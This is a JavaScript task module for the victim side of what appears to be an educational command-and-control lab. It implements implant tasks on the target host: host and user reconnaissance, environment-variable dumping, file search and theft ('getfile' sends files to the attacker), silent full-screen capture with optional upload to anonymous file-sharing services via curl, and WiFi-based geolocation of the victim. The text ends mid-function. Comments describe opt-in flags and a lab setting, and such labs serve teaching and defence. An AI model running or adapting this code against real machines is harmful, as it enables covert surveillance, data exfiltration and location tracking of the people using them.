// MOCK task implementations. This is a hard-coded allowlist on purpose:
// the victim agent can NEVER execute arbitrary shell commands — only these
// deterministic, read-mostly operations. `getfile` is the most capable one:
// it reads one file inside the configured filesystem root, size-capped, so the lab can
// demonstrate binary transfer over the channel. Everything still travels as
// plain base64.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { TASK_OPS } from '../common/protocol.js';
import { getOpDef } from '../common/ops.js';
import { runFunTask } from './fun.js';

export const DEFAULT_MAX_FILE_BYTES = 32 * 1024;
export const HASH_MAX_BYTES = 64 * 1024 * 1024; // hashing does not transfer bytes
export const LS_MAX_ENTRIES = 200; // keep result tags bounded
export const PS_MAX_LINES = 40;
export const FIND_MAX_RESULTS = 100;
export const FIND_MAX_DEPTH = 6;
export const GEO_MAX_APS = 20; // keep result tags bounded (~130B/tag)
export const GEO_MAX_SSID_LEN = 32;
export const GEO_HTTP_TIMEOUT_MS = 12_000;
// beaconDB (the key-free MLS successor) requires clients to identify
// themselves; a generic curl UA may be refused.
export const GEO_USER_AGENT = 'kc2-lab/1.0 (educational wifi-positioning demo)';
// Working WPS endpoint as of 2026: no key, MLS/Ichnaea-compatible.
export const GEO_DEFAULT_SERVICE_URL = 'https://api.beacondb.net/v1/geolocate';

const WINDOWS_PS_SCRIPT = `
$total=[double](Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory;
'    PID    PPID  %CPU  %MEM COMMAND';
Get-CimInstance Win32_Process |
  Sort-Object WorkingSetSize -Descending |
  Select-Object -First 40 |
  ForEach-Object {
    $mem=if ($total -gt 0) { 100 * [double]$_.WorkingSetSize / $total } else { 0 };
    '{0,7} {1,7} {2,5} {3,5:N1} {4}' -f $_.ProcessId,$_.ParentProcessId,'?',$mem,$_.Name;
  }`;
const WINDOWS_DF_SCRIPT = `
'Filesystem Size Used Avail Use% Mounted';
Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | ForEach-Object {
  $size=[double]$_.Size; $free=[double]$_.FreeSpace; $used=$size-$free;
  $pct=if ($size -gt 0) { [Math]::Round(100*$used/$size) } else { 0 };
  '{0} {1:N0} {2:N0} {3:N0} {4}% {0}' -f $_.DeviceID,$size,$used,$free,$pct;
}`;
// Captures the entire virtual screen (every display, not just the desktop
// window). The output path arrives as argv — nothing is interpolated.
const WINDOWS_SCREENSHOT_SCRIPT = `
Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
$v=[System.Windows.Forms.SystemInformation]::VirtualScreen;
$b=New-Object System.Drawing.Bitmap $v.Width,$v.Height;
$g=[System.Drawing.Graphics]::FromImage($b);
$g.CopyFromScreen($v.Left,$v.Top,0,0,$b.Size);
$b.Save($args[0],[System.Drawing.Imaging.ImageFormat]::Png);`;
// Resizes an image to a target width (aspect preserved) and saves it as JPEG.
// argv: input, output, width, quality — nothing is interpolated.
const WINDOWS_RESIZE_SCRIPT = `
Add-Type -AssemblyName System.Drawing;
$src=[System.Drawing.Image]::FromFile($args[0]);
$w=[int]$args[2]; $h=[Math]::Max(1,[int]($src.Height*$w/$src.Width));
$b=New-Object System.Drawing.Bitmap $w,$h;
$g=[System.Drawing.Graphics]::FromImage($b);
$g.InterpolationMode=[System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic;
$g.DrawImage($src,0,0,$w,$h);
$ep=New-Object System.Drawing.Imaging.EncoderParameters 1;
$ep.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,[long]$args[3]);
$codec=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' };
$b.Save($args[1],$codec,$ep);
$g.Dispose();$b.Dispose();$src.Dispose();`;

export const DEFAULT_SCREENSHOT_MAX_WIDTH = 1280;
export const SCREENSHOT_MIN_WIDTH = 240;
export const SCREENSHOT_WIDTH_RANGE = Object.freeze([160, 7680]);
const SCREENSHOT_JPEG_QUALITY = 60;
// The channel moves ~130 payload bytes per dist-tag, so a raw full-screen PNG
// (often several MiB) would need tens of thousands of tags. Instead the victim
// walks this width ladder until the JPEG fits the maxFileBytes cap.
const SCREENSHOT_SCALE_LADDER = Object.freeze([1, 0.75, 0.5, 0.35, 0.25, 0.15]);

function screenshotWidths(startWidth) {
  const widths = [];
  for (const f of SCREENSHOT_SCALE_LADDER) {
    const w = Math.max(SCREENSHOT_MIN_WIDTH, Math.round(startWidth * f));
    if (!widths.includes(w)) widths.push(w);
  }
  return widths;
}

function validateScreenshotWidth(value) {
  const w = Number(value);
  if (!Number.isInteger(w) || w < SCREENSHOT_WIDTH_RANGE[0] || w > SCREENSHOT_WIDTH_RANGE[1]) {
    throw new Error(
      `screenshot width must be an integer from ${SCREENSHOT_WIDTH_RANGE[0]} to ${SCREENSHOT_WIDTH_RANGE[1]}`,
    );
  }
  return w;
}

/**
 * Write `src` (any image) to `dest` as a JPEG whose largest side is `width`.
 * Built-in tools only: sips on macOS, ImageMagick on Linux, System.Drawing
 * on Windows. Throws if the platform has no resizer.
 */
function downscaleToJpeg(platform, exec, src, dest, width) {
  const EXEC_OPTS = { encoding: 'utf8', timeout: 20_000, windowsHide: true };
  const q = String(SCREENSHOT_JPEG_QUALITY);
  if (platform === 'darwin') {
    exec('sips', ['-Z', String(width), '-s', 'format', 'jpeg', '-s', 'formatOptions', q, src, '--out', dest], EXEC_OPTS);
    return;
  }
  if (platform === 'linux') {
    const errors = [];
    for (const file of ['convert', 'magick']) {
      try {
        exec(file, [src, '-resize', `${width}x${width}`, '-quality', q, dest], EXEC_OPTS);
        return;
      } catch (err) {
        errors.push(`${file}: ${err.message.split('\n')[0]}`);
      }
    }
    throw new Error(`no image resizer found (${errors.join('; ')})`);
  }
  if (platform === 'win32') {
    exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_RESIZE_SCRIPT, src, dest, String(width), q], EXEC_OPTS);
    return;
  }
  throw new Error(`screenshot downscaling is not supported on ${platform}`);
}

/** True when a capture tool actually wrote a non-empty image. */
function captureSucceeded(p) {
  try {
    return fs.statSync(p).size > 0;
  } catch {
    return false;
  }
}

function hostOf(url) {
  try {
    return new URL(url).host;
  } catch {
    return String(url);
  }
}

/** Merge the uploadUrls list and the legacy single uploadUrl, deduped, in order. */
export function normalizeUploadUrls(options = {}) {
  const list = Array.isArray(options.uploadUrls) ? options.uploadUrls : [];
  const single = String(options.uploadUrl ?? '').trim();
  const urls = [...list.map((u) => String(u ?? '').trim()), ...(single ? [single] : [])];
  return [...new Set(urls.filter(Boolean))];
}

/**
 * Upload a file to an anonymous, no-key file-sharing endpoint with curl
 * (`-F file=@path`, the convention used by 0x0.st, tmpfiles.org, catbox,
 * transfer.sh-style services) and extract the download URL from the
 * response. Handles both bare-URL responses (0x0.st) and the common JSON
 * shapes ({link}, {url}, {data:{url}}).
 */
export function uploadFileAndExtractUrl(uploadUrl, filePath, exec) {
  const out = exec(
    'curl',
    ['-sS', '-X', 'POST', '-F', `file=@${filePath}`, '--max-time', '30', uploadUrl],
    { encoding: 'utf8', timeout: 40_000, windowsHide: true },
  );
  const text = out.trim();
  let candidate = text;
  try {
    const j = JSON.parse(text);
    candidate = j?.link ?? j?.url ?? j?.data?.url ?? j?.data?.link ?? '';
  } catch {
    // Plain-text response body (e.g. 0x0.st) — already the candidate.
  }
  candidate = String(candidate ?? '').trim();
  if (!/^https?:\/\/\S+$/.test(candidate)) {
    throw new Error(`upload service returned no usable URL: ${text.slice(0, 120) || '(empty body)'}`);
  }
  return candidate;
}

/**
 * Walk the width ladder until the downscaled JPEG fits the channel cap.
 * Returns { path, width, size } of the first fitting file.
 */
function fitScreenshotToCap({ platform, exec, src, maxBytes, startWidth, makeTmp }) {
  const attempts = [];
  for (const width of screenshotWidths(startWidth)) {
    const dest = makeTmp(width);
    try {
      downscaleToJpeg(platform, exec, src, dest, width);
    } catch (err) {
      fs.rmSync(dest, { force: true });
      throw err; // no resizer tool: smaller widths will not help
    }
    const size = fs.statSync(dest).size;
    if (size <= maxBytes) return { path: dest, width, size };
    fs.rmSync(dest, { force: true });
    attempts.push(`${width}px=${size}B`);
  }
  throw new Error(
    `screenshot does not fit the ${maxBytes} byte cap even as a ${SCREENSHOT_MIN_WIDTH}px JPEG ` +
      `(${attempts.join(', ')}) — raise maxFileBytes`,
  );
}

const BSSID_RE = /^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$/;
const MACOS_AIRPORT_PATH =
  '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport';

function cleanSsid(value) {
  return String(value ?? '')
    .replace(/[\r\n]/g, ' ')
    .trim()
    .slice(0, GEO_MAX_SSID_LEN);
}

/** Legacy `airport -s` (removed in macOS 14.4, kept for older lab hosts). */
export function parseAirportScan(text) {
  const aps = [];
  for (const line of String(text).split('\n')) {
    const m = /^(.*?)\s+(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})\s+(-?\d+)\s/.exec(line);
    if (!m || /^\s*SSID\s/.test(line)) continue;
    aps.push({ bssid: m[2].toLowerCase(), ssid: cleanSsid(m[1]), rssi: Number(m[4]) });
  }
  return aps;
}

/** `system_profiler SPAirPortDataType` — the post-macOS-14.4 fallback. */
export function parseSystemProfilerWifi(text) {
  const aps = [];
  let lastHeader = '';
  for (const line of String(text).split('\n')) {
    const header = /^\s{4,}(\S[^:]*):\s*$/.exec(line);
    if (header) lastHeader = header[1];
    const m = /BSSID:\s*((?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})\s*$/.exec(line);
    if (m) {
      aps.push({ bssid: m[1].toLowerCase(), ssid: cleanSsid(lastHeader), rssi: null });
    }
  }
  return aps;
}

/** `nmcli -t -f BSSID,SSID,SIGNAL dev wifi list` (backslash-escaped fields). */
function splitNmcliLine(line) {
  const parts = [];
  let cur = '';
  for (let i = 0; i < line.length; i++) {
    if (line[i] === '\\' && i + 1 < line.length) {
      cur += line[i + 1];
      i++;
    } else if (line[i] === ':') {
      parts.push(cur);
      cur = '';
    } else {
      cur += line[i];
    }
  }
  parts.push(cur);
  return parts;
}

export function parseNmcliScan(text) {
  const aps = [];
  for (const line of String(text).split('\n')) {
    if (!line.trim()) continue;
    const [bssid, ssid, signal] = splitNmcliLine(line);
    if (!BSSID_RE.test(bssid ?? '')) continue;
    const pct = Number(signal);
    // nmcli reports 0-100 quality; approximate dBm like iwconfig does
    const rssi = Number.isFinite(pct) ? Math.round(pct / 2 - 100) : null;
    aps.push({ bssid: bssid.toLowerCase(), ssid: cleanSsid(ssid), rssi });
  }
  return aps;
}

/** `netsh wlan show networks mode=bssid` on Windows. */
export function parseNetshScan(text) {
  const aps = [];
  let ssid = '';
  for (const line of String(text).split('\n')) {
    const s = /^SSID \d+ : (.*)$/.exec(line);
    if (s) {
      ssid = cleanSsid(s[1]);
      continue;
    }
    const b = /BSSID \d+\s*:\s*((?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})/.exec(line);
    if (b) {
      aps.push({ bssid: b[1].toLowerCase(), ssid, rssi: null });
      continue;
    }
    const sig = /Signal\s*:\s*(\d+)%/.exec(line);
    if (sig && aps.length > 0 && aps[aps.length - 1].rssi === null) {
      aps[aps.length - 1].rssi = Math.round(Number(sig[1]) / 2 - 100);
    }
  }
  return aps;
}

function dedupeAndSortAps(aps) {
  const seen = new Set();
  const out = [];
  for (const ap of aps) {
    if (seen.has(ap.bssid)) continue;
    seen.add(ap.bssid);
    out.push(ap);
  }
  out.sort((a, b) => (b.rssi ?? -127) - (a.rssi ?? -127));
  return out;
}

/**
 * Scan visible WiFi access points with OS built-in tools — stage 1 of the
 * WiFi positioning technique an attacker uses: collect the BSSIDs the
 * victim's radio can hear, since each BSSID is a worldwide index key in
 * wardriving-derived location databases.
 */
export function scanWifiNetworks(platform, exec) {
  const EXEC_OPTS = { encoding: 'utf8', timeout: 25_000, windowsHide: true };
  const errors = [];
  const attempts = [];
  if (platform === 'darwin') {
    attempts.push(
      [MACOS_AIRPORT_PATH, ['-s'], parseAirportScan],
      ['system_profiler', ['SPAirPortDataType'], parseSystemProfilerWifi],
    );
  } else if (platform === 'linux') {
    attempts.push(['nmcli', ['-t', '-f', 'BSSID,SSID,SIGNAL', 'dev', 'wifi', 'list'], parseNmcliScan]);
  } else if (platform === 'win32') {
    attempts.push(['netsh', ['wlan', 'show', 'networks', 'mode=bssid'], parseNetshScan]);
  } else {
    throw new Error(`geolocate is not supported on ${platform}`);
  }
  for (const [file, args, parse] of attempts) {
    try {
      const aps = dedupeAndSortAps(parse(exec(file, args, EXEC_OPTS)));
      if (aps.length > 0) return aps;
      errors.push(`${file}: scan returned no access points (WiFi off, or BSSIDs redacted by OS privacy rules)`);
    } catch (err) {
      errors.push(`${file}: ${err.message.split('\n')[0]}`);
    }
  }
  throw new Error(`WiFi scan failed — ${errors.join('; ')}`);
}

/**
 * Stage 2: resolve the scanned BSSIDs against a WiFi Positioning System
 * (WPS) database. Uses the shared Google/Mozilla "geolocate" request shape,
 * so any MLS-compatible endpoint works (Google Geolocation API, Mozilla
 * Location Service, or a local mock). The request is sent with curl and a
 * temp-file body — nothing is interpolated into a shell.
 */
export function lookupWpsLocation(serviceUrl, serviceKey, aps, exec) {
  // considerIp lets services with sparse WiFi coverage (beaconDB outside
  // mapped areas) fall back to a coarse IP estimate — the response marks it
  // with `fallback`, which is itself a nice classroom contrast.
  const body = {
    considerIp: true,
    wifiAccessPoints: aps.map((ap) => ({
      macAddress: ap.bssid,
      ...(ap.rssi !== null ? { signalStrength: ap.rssi } : {}),
    })),
  };
  const tmp = path.join(
    fs.realpathSync(os.tmpdir()),
    `kc2-geo-${process.pid}-${crypto.randomBytes(4).toString('hex')}.json`,
  );
  let url = serviceUrl;
  if (serviceKey) url += `${url.includes('?') ? '&' : '?'}key=${encodeURIComponent(serviceKey)}`;
  try {
    fs.writeFileSync(tmp, JSON.stringify(body), { mode: 0o600 });
    const out = exec(
      'curl',
      ['-sS', '-X', 'POST',
        '-H', 'Content-Type: application/json',
        '-H', `User-Agent: ${GEO_USER_AGENT}`,
        '--data-binary', `@${tmp}`, '--max-time', String(Math.ceil(GEO_HTTP_TIMEOUT_MS / 1000)), url],
      { encoding: 'utf8', timeout: GEO_HTTP_TIMEOUT_MS + 5000, windowsHide: true },
    );
    let parsed;
    try {
      parsed = JSON.parse(out);
    } catch {
      throw new Error(`WPS service returned non-JSON: ${out.slice(0, 120)}`);
    }
    if (parsed?.error) {
      const msg = parsed.error.message ?? JSON.stringify(parsed.error).slice(0, 120);
      throw new Error(`WPS service error: ${msg}`);
    }
    const lat = Number(parsed?.location?.lat);
    const lng = Number(parsed?.location?.lng);
    if (!Number.isFinite(lat) || Math.abs(lat) > 90 || !Number.isFinite(lng) || Math.abs(lng) > 180) {
      throw new Error('WPS service returned no valid coordinates');
    }
    const accuracy = Number(parsed?.accuracy);
    return {
      lat,
      lng,
      accuracyM: Number.isFinite(accuracy) && accuracy > 0 ? Math.round(accuracy) : null,
      fallback: typeof parsed?.fallback === 'string' ? parsed.fallback : null,
    };
  } finally {
    fs.rmSync(tmp, { force: true });
  }
}

function positiveLimit(value, fallback) {
  const n = Number(value);
  return Number.isFinite(n) && n > 0 ? Math.floor(n) : fallback;
}

function safeValue(fn, fallback = '?') {
  try {
    return fn();
  } catch {
    return fallback;
  }
}

/**
 * Resolve a task path against the agent cwd. The realpath is returned so
 * symlink targets are reported (and read) as their real location.
 */
function resolvePath(requestedPath, _limits = {}) {
  const p = typeof requestedPath === 'string' ? requestedPath.trim() : '';
  if (!p) throw new Error('a path argument is required');
  if (p.includes('\0')) throw new Error('path contains NUL byte');
  return fs.realpathSync(path.resolve(process.cwd(), p));
}

function describeEntry(dir, name) {
  const st = fs.lstatSync(path.join(dir, name));
  const type = st.isDirectory() ? 'dir' : st.isSymbolicLink() ? 'link' : st.isFile() ? 'file' : 'other';
  return { type, size: st.size, name };
}

const TASKS = {
  echo(args = {}) {
    const text = typeof args.text === 'string' ? args.text : '';
    return `echo: ${text}`;
  },

  sysinfo() {
    const cpus = safeValue(() => os.cpus(), []);
    return [
      `platform=${safeValue(() => os.platform())}`,
      `arch=${safeValue(() => os.arch())}`,
      `release=${safeValue(() => os.release())}`,
      `hostname=${safeValue(() => os.hostname())}`,
      `uptimeSec=${safeValue(() => Math.floor(os.uptime()))}`,
      `cpus=${Array.isArray(cpus) ? cpus.length : '?'}`,
      `totalMemMB=${safeValue(() => Math.round(os.totalmem() / 1024 / 1024))}`,
      `freeMemMB=${safeValue(() => Math.round(os.freemem() / 1024 / 1024))}`,
    ].join(' ');
  },

  ping() {
    return 'pong';
  },

  time() {
    return new Date().toISOString();
  },

  whoami() {
    const u = safeValue(() => os.userInfo(), {});
    return [
      `user=${u.username ?? '?'}`,
      `uid=${u.uid ?? '?'}`,
      `gid=${u.gid ?? '?'}`,
      `home=${u.homedir ?? '?'}`,
      `shell=${u.shell ?? '?'}`,
      `hostname=${safeValue(() => os.hostname())}`,
      `pid=${process.pid}`,
      `node=${process.version}`,
    ].join(' ');
  },

  pwd() {
    return process.cwd();
  },

  /**
   * Environment variable inventory. Values are redacted by default so
   * secrets never cross the channel; the victim operator can opt in to
   * real values with the `revealEnv` config flag.
   */
  env(_args = {}, limits = {}) {
    const reveal = limits.revealEnv === true;
    const lines = Object.keys(process.env).sort().map(
      (key) => `${key}=${reveal ? process.env[key] : '<redacted>'}`,
    );
    return lines.join('\n') || '(empty environment)';
  },

  /** Network interfaces and addresses (internal ones flagged). */
  netinfo() {
    const ifaces = os.networkInterfaces();
    const lines = [];
    for (const [name, addrs] of Object.entries(ifaces)) {
      for (const a of addrs ?? []) {
        lines.push(
          `${name.padEnd(12)} ${String(a.family).padEnd(6)} ${a.address}${a.internal ? ' (internal)' : ''}`,
        );
      }
    }
    return lines.join('\n') || '(no interfaces)';
  },

  /** Top processes by memory. */
  ps(_args = {}, options = {}) {
    const platform = options.platform ?? process.platform;
    const exec = options.execFileSync ?? execFileSync;
    if (platform === 'win32') {
      return exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_PS_SCRIPT], {
        encoding: 'utf8', timeout: 10_000, windowsHide: true,
      }).trim();
    }
    const out = exec('ps', ['-eo', 'pid,ppid,pcpu,pmem,comm'], {
      encoding: 'utf8',
      timeout: 5000,
    });
    const [header, ...rows] = out.trim().split('\n');
    const sorted = rows
      .map((line) => {
        const m = /^\s*(\d+)\s+(\d+)\s+([\d.]+)\s+([\d.]+)\s+(.*)$/.exec(line);
        return m ? { pid: m[1], ppid: m[2], cpu: m[3], mem: Number(m[4]), cmd: m[5] } : null;
      })
      .filter(Boolean)
      .sort((a, b) => b.mem - a.mem)
      .slice(0, PS_MAX_LINES);
    const lines = sorted.map(
      (p) => `${p.pid.padStart(7)} ${p.ppid.padStart(7)} ${p.cpu.padStart(5)} ${p.mem.toFixed(1).padStart(5)} ${p.cmd}`,
    );
    return `${header}\n${lines.join('\n')}`;
  },

  /** Filesystem usage. */
  df(_args = {}, options = {}) {
    const platform = options.platform ?? process.platform;
    const exec = options.execFileSync ?? execFileSync;
    if (platform === 'win32') {
      return exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_DF_SCRIPT], {
        encoding: 'utf8', timeout: 10_000, windowsHide: true,
      }).trim();
    }
    return exec('df', ['-h'], { encoding: 'utf8', timeout: 5000 }).trim();
  },

  /** Change the agent's working directory; later relative paths follow it. */
  cd(args = {}, limits = {}) {
    const dir = resolvePath(args.path, limits);
    const st = fs.statSync(dir);
    if (!st.isDirectory()) throw new Error(`not a directory: ${dir}`);
    process.chdir(dir);
    return process.cwd();
  },

  /** List a directory (default: cwd). Output is one "type size name" per line. */
  ls(args = {}, limits = {}) {
    const dir = resolvePath(args.path || '.', limits);
    const st = fs.statSync(dir);
    if (!st.isDirectory()) throw new Error(`not a directory: ${dir}`);
    const names = fs.readdirSync(dir).sort();
    const lines = [];
    for (const name of names.slice(0, LS_MAX_ENTRIES)) {
      try {
        const e = describeEntry(dir, name);
        lines.push(`${e.type.padEnd(5)} ${String(e.size).padStart(10)} ${e.name}`);
      } catch {
        lines.push(`?          ? ${name}`);
      }
    }
    const header = `${dir} (${names.length} entries)`;
    const truncated = names.length > LS_MAX_ENTRIES ? `\n... truncated at ${LS_MAX_ENTRIES}` : '';
    return `${header}\n${lines.join('\n')}${truncated}`;
  },

  /** File metadata: type, size, timestamps, permissions. */
  stat(args = {}, limits = {}) {
    const p = resolvePath(args.path, limits);
    const st = fs.statSync(p);
    const type = st.isDirectory() ? 'dir' : st.isFile() ? 'file' : 'other';
    return [
      `path=${p}`,
      `type=${type}`,
      `size=${st.size}`,
      `mode=${(st.mode & 0o777).toString(8)}`,
      `mtime=${st.mtime.toISOString()}`,
      `ctime=${st.ctime.toISOString()}`,
    ].join(' ');
  },

  /** SHA-256 of a file (read-only, capped at HASH_MAX_BYTES). */
  hash(args = {}, limits = {}) {
    const p = resolvePath(args.path, limits);
    const st = fs.statSync(p);
    if (!st.isFile()) throw new Error(`not a regular file: ${p}`);
    if (st.size > HASH_MAX_BYTES) {
      throw new Error(`file too large to hash: ${st.size} bytes (cap ${HASH_MAX_BYTES})`);
    }
    const digest = crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex');
    return `sha256 ${digest}  ${p} (${st.size} bytes)`;
  },

  /** Recursively find files under a directory whose name contains the query. */
  find(args = {}, limits = {}) {
    const root = resolvePath(args.path, limits);
    const query = String(args.query ?? '').toLowerCase();
    if (!query) throw new Error('find requires a name query');
    const st = fs.statSync(root);
    if (!st.isDirectory()) throw new Error(`not a directory: ${root}`);

    const hits = [];
    let truncated = false;
    const walk = (dir, depth) => {
      if (truncated || depth > FIND_MAX_DEPTH) return;
      let entries;
      try {
        entries = fs.readdirSync(dir, { withFileTypes: true });
      } catch {
        return; // unreadable directory: skip silently
      }
      for (const e of entries) {
        if (truncated) return;
        const full = path.join(dir, e.name);
        if (e.name.toLowerCase().includes(query)) {
          hits.push(full);
          if (hits.length >= FIND_MAX_RESULTS) {
            truncated = true;
            return;
          }
        }
        if (e.isDirectory()) walk(full, depth + 1);
      }
    };
    walk(root, 0);

    const header = `${hits.length}${truncated ? '+' : ''} match(es) for "${args.query}" under ${root}`;
    return hits.length === 0 ? header : `${header}\n${hits.join('\n')}`;
  },

  /**
   * Read one file and return it for transfer to the attacker. The path is
   * absolute or relative to the agent's cwd.
   * Returns { output, file } instead of a plain string; the file bytes ride
   * in the result payload as base64 and are chunked by the protocol encoder.
   */
  getfile(args = {}, limits = {}) {
    const p = typeof args.path === 'string' ? args.path.trim() : '';
    if (!p) throw new Error('getfile requires args.path');
    const max = positiveLimit(limits.maxFileBytes, DEFAULT_MAX_FILE_BYTES);
    const file = resolvePath(p, limits);
    const st = fs.statSync(file);
    if (!st.isFile()) throw new Error(`not a regular file: ${file}`);
    if (st.size > max) {
      throw new Error(
        `file too large: ${st.size} bytes (cap ${max}) - the dist-tag channel ` +
          'moves ~130 bytes per tag; raise maxFileBytes only for small demos',
      );
    }
    const data = fs.readFileSync(file);
    return {
      output: `${file} (${st.size} bytes)`,
      file: { name: path.basename(file), size: st.size, dataB64: data.toString('base64') },
    };
  },

  /**
   * Capture the whole screen (all displays, not only the desktop window) with
   * OS built-in tools — no dependencies. The image rides back exactly like a
   * getfile transfer, capped by maxFileBytes. A raw full-screen PNG rarely
   * fits the ~130-bytes-per-tag channel, so when the PNG exceeds the cap the
   * handler walks a downscale ladder (sips / ImageMagick / System.Drawing)
   * and sends a JPEG at the largest width that fits, starting at
   * screenshotMaxWidth (attacker-overridable per task via args.width).
   * Temp files never touch the configured filesystem root and are always
   * removed afterwards. Gated behind the enableScreenshot config flag; run
   * it only on an attended lab host. On macOS the agent's terminal needs
   * Screen Recording permission, otherwise screencapture fails or returns a
   * blank image.
   */
  screenshot(args = {}, options = {}) {
    const platform = options.platform ?? process.platform;
    const exec = options.execFileSync ?? execFileSync;
    const tmpDir = fs.realpathSync(os.tmpdir());
    const stamp = `kc2-shot-${process.pid}-${crypto.randomBytes(4).toString('hex')}`;
    const tmp = path.join(tmpDir, `${stamp}.png`);
    const temps = [tmp];
    const EXEC_OPTS = { encoding: 'utf8', timeout: 15_000, windowsHide: true };
    try {
      if (platform === 'darwin') {
        exec('screencapture', ['-x', '-t', 'png', tmp], EXEC_OPTS);
        if (!captureSucceeded(tmp)) {
          throw new Error(
            'screencapture wrote no image — grant the agent\'s terminal Screen Recording permission',
          );
        }
      } else if (platform === 'linux') {
        // Tools can exit 0 without writing anything (X11 utilities on a
        // Wayland session), so every candidate is verified against the file.
        // Order follows the session type: Wayland desktops need portal- or
        // compositor-native tools, X11 tools first otherwise.
        const env = options.env ?? process.env;
        const sessionType = String(env.XDG_SESSION_TYPE ?? 'unknown');
        const waylandTools = [
          ['gnome-screenshot', ['-f', tmp]], // GNOME portal (may require consent UI)
          ['spectacle', ['-b', '-n', '-o', tmp]], // KDE Plasma Wayland, background mode
          ['grim', [tmp]], // wlroots-native (sway & friends)
        ];
        const x11Tools = [
          ['import', ['-window', 'root', tmp]], // ImageMagick (X11 only)
          ['scrot', [tmp]], // X11 only
        ];
        const candidates = sessionType === 'wayland'
          ? [...waylandTools, ...x11Tools]
          : [...x11Tools, ...waylandTools];
        const failures = [];
        for (const [file, toolArgs] of candidates) {
          fs.rmSync(tmp, { force: true });
          try {
            exec(file, toolArgs, EXEC_OPTS);
            if (captureSucceeded(tmp)) break;
            failures.push(`${file}: exited without writing an image`);
          } catch (err) {
            failures.push(`${file}: ${err.message.split('\n')[0]}`);
          }
        }
        if (!captureSucceeded(tmp)) {
          throw new Error(
            `no screenshot tool produced an image (session=${sessionType}) — ${failures.join('; ')}. ` +
              'Wayland: install spectacle (KDE) or grim (wlroots); GNOME Wayland blocks silent ' +
              'capture by design (portal consent dialog). X11: install scrot or imagemagick.',
          );
        }
      } else if (platform === 'win32') {
        exec('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', WINDOWS_SCREENSHOT_SCRIPT, tmp], EXEC_OPTS);
        if (!captureSucceeded(tmp)) {
          throw new Error('screen capture wrote no image');
        }
      } else {
        throw new Error(`screenshot is not supported on ${platform}`);
      }
      const max = positiveLimit(options.maxFileBytes, DEFAULT_MAX_FILE_BYTES);
      // Exfil-by-reference mode (opt-in): upload the full-resolution PNG to
      // the first reachable anonymous file share and return just the URL —
      // one result tag instead of hundreds. Services are tried in order;
      // channel transfer is the final fallback.
      const uploadUrls = normalizeUploadUrls(options);
      let uploadNote = '';
      if (uploadUrls.length > 0) {
        const failures = [];
        for (const endpoint of uploadUrls) {
          try {
            const url = uploadFileAndExtractUrl(endpoint, tmp, exec);
            const st = fs.statSync(tmp);
            const via = failures.length > 0
              ? ` via ${hostOf(endpoint)} (after ${failures.length} service failure(s))`
              : '';
            return (
              `screen captured (${st.size} bytes PNG, full resolution)${via} -> ${url}\n` +
              'note: anyone with this link can read the image; treat it as expired after the demo'
            );
          } catch (err) {
            failures.push(`${hostOf(endpoint)}: ${err.message.split('\n')[0]}`);
          }
        }
        uploadNote = `all ${uploadUrls.length} upload service(s) failed (${failures.join('; ')}) — fell back to channel transfer, `;
      }
      let finalPath = tmp;
      let name = 'screenshot.png';
      let note = 'PNG';
      if (fs.statSync(tmp).size > max) {
        const startWidth = validateScreenshotWidth(
          args.width ?? options.screenshotMaxWidth ?? DEFAULT_SCREENSHOT_MAX_WIDTH,
        );
        const fitted = fitScreenshotToCap({
          platform,
          exec,
          src: tmp,
          maxBytes: max,
          startWidth,
          makeTmp: (w) => {
            const p = path.join(tmpDir, `${stamp}-w${w}.jpg`);
            temps.push(p);
            return p;
          },
        });
        finalPath = fitted.path;
        name = 'screenshot.jpg';
        note = `JPEG downscaled to ${fitted.width}px to fit the ${max}-byte channel cap`;
      }
      const st = fs.statSync(finalPath);
      const data = fs.readFileSync(finalPath);
      return {
        output: `screen captured (${uploadNote}${st.size} bytes ${note})`,
        file: { name, size: st.size, dataB64: data.toString('base64') },
      };
    } finally {
      for (const p of temps) fs.rmSync(p, { force: true });
    }
  },

  /**
   * Demonstrate the classic WiFi positioning attack: the agent scans the
   * BSSIDs its radio can hear (stage 1, reconnaissance), then resolves them
   * against a WPS database for coordinates with an accuracy estimate
   * (stage 2) — the same technique real-world implants use to locate hosts
   * that have no GPS. Stage 2 only runs when the victim operator configures
   * geolocateServiceUrl (any MLS/Google-compatible endpoint, including a
   * local mock); without it the task returns the scan-only artifact, which
   * is itself the teachable output. Gated behind enableGeolocate.
   */
  geolocate(_args = {}, options = {}) {
    const platform = options.platform ?? process.platform;
    const exec = options.execFileSync ?? execFileSync;
    const aps = scanWifiNetworks(platform, exec);
    const used = aps.slice(0, GEO_MAX_APS);
    const serviceUrl = String(options.geolocateServiceUrl ?? '').trim();
    const lines = [];
    if (serviceUrl) {
      const fix = lookupWpsLocation(serviceUrl, String(options.geolocateServiceKey ?? ''), used, exec);
      lines.push('geolocate: wifi-scan + WPS database lookup');
      lines.push(
        `location: lat=${fix.lat} lng=${fix.lng} accuracyM=${fix.accuracyM ?? 'unknown'}`,
      );
      if (fix.fallback) {
        lines.push(`fallback: ${fix.fallback} (coarse estimate — the WiFi BSSIDs were not in the database)`);
      }
      lines.push(`service: ${new URL(serviceUrl).host}`);
    } else {
      lines.push('geolocate: wifi-scan (reconnaissance stage — no WPS lookup configured)');
      lines.push(`set geolocateServiceUrl on the victim (e.g. ${GEO_DEFAULT_SERVICE_URL}) to resolve coordinates`);
    }
    lines.push(`access points (${used.length}${aps.length > used.length ? ` of ${aps.length}` : ''}):`);
    for (const ap of used) {
